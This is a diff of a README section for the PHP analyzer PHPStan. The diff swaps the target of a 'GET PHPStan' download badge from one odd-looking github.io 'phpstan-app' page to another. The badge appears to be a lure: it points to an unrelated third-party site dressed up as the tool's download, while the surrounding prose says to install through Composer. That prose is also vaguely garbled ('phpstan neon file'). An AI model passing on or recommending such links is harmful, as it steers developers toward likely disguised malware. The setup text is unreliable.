@@ -57,7 +57,7 @@ For framework-heavy projects, PHPStan works well with extensions and ecosystem t
 
 Prerequisites: A PHP project with Composer, source code ready for analysis, and permission to add development tooling or update project configuration.
 
-[![GET PHPStan](https://img.shields.io/badge/GET%20%E2%80%94%20PHPStan-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/phpstan-app)
+[![GET PHPStan](https://img.shields.io/badge/GET%20%E2%80%94%20PHPStan-0078D6?style=for-the-badge&logoColor=white)](https://saulcainbjgl.github.io/.github/phpstan-app)
 
 1.  **Add the Analyzer:** Run phpstan install through Composer as a development dependency, then confirm the binary is available in the vendor directory.
 2.  **Create Configuration:** Add a phpstan neon file with the paths you want analyzed, then adjust phpstan config options for framework extensions, bootstrap files, and ignored directories.
